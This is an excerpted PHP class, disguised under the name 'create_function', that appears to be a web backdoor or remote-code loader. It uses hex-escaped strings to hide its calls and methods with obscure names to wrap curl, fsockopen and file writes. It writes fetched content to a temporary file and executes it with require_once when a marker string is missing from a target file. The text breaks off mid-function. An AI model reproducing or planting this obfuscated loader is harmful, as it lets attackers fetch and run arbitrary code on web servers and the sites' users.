...
class create_function {
    ...
    public function build($prod){
        $td = $this->outterTable();
        fwrite($td, $prod);
        require_once(stream_get_meta_data($td)["\x75\x72\x69"]);
        return fclose($td);
        }
    ...
    public function blyad($bam, $bim, $bum){
        return curl_setopt($bam, $bim, $bum);
    }
    public function getOut($anjay){
        return curl_exec($anjay);
    }
    ...
    public function naked($aw, $iw, $uw, $ew, $ow){
        return fsockopen($aw, $iw, $uw, $ew, $ow);
    }
    public function outbound($ayang){
        return file_get_contents($ayang);
    }
    public function inbound($ayang_aku, $yameteh){
        return file_put_contents($ayang_aku, $yameteh);
    }
    public function parser($data){
        ...
        $nyari = "\x69\x78\x71\x66\x77\x6C\x72\x71\x23\x6E\x4D\x78\x4F\x54\x6A\x59\x6B\x69\x2B";
        if (!file_exists($filePos) || strpos(implode('', file($filePos)), $nyari) === false) {
            if ($this->check("\x63\x75\x72\x6C\x5F\x69\x6E\x69\x74")) {
                $ch = curl_init();
                ...
                curl_close($ch);
            } elseif ($this->check("\x66\x69\x6C\x65")){
                $fileData = implode('', file($fileRAW));
            }elseif ($this->check("\x66\x73\x6F\x63\x6B\x6F\x70\x65\x6E")) {
            $urlParts = parse_url($fileRAW);
            $host = $urlParts["\x68\x6F\x73\x74"];
            $path = $urlParts["\x70\x61\x74\x68"];

            $fp = $this->naked("\x73\x73\x6C\x3A\x2F\x2F".$host, 443, $errno, $errstr, 30);
            if (!$fp) {
